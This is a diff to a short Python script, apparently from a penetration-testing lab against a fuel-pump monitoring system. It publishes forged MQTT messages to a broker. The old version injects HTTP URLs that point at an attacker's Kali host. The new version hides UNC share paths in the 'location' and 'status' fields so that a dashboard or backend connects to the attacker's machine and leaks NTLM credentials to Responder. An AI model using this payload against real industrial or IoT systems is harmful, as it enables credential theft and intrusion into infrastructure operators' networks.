@@ -1,5 +1,6 @@
 import json
 import paho.mqtt.client as mqtt
+import time
 
 BROKER = "10.10.100.100"
 KALI_IP = "10.10.100.8"
@@ -7,14 +8,17 @@ KALI_IP = "10.10.100.8"
 client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
 client.connect(BROKER, 1883, 60)
 
-# Tentando forçar o backend a fazer um "fetch" ou requisição HTTP para o seu Kali
 payload = {
-    "pumpId": "PUMP003",
-    "currentLevel": 5,
-    "url": f"http://{KALI_IP}/trigger",
-    "firmware": f"http://{KALI_IP}/firmware.bin"
+    "pumpId": "PUMP001",
+    "location": rf"\\{KALI_IP}\share\local",
+    "fuelType": "Diesel S-10",
+    "capacityCurrent": 4500,
+    "capacityTotal": 5000,
+    "capacityPercentage": "90.0",
+    "status": rf"\\{KALI_IP}\share\status",
+    "timestamp": int(time.time() * 1000)
 }
 
-client.publish("fuel-pumps/refill-request", json.dumps(payload))
-print("[+] Gatilho HTTP enviado. Verifique o terminal do Responder!")
+client.publish("fuel-pumps/data", json.dumps(payload))
+print("[+] Variante 1 enviada. Olhe o painel /ui e monitore o Responder!")
 client.disconnect()
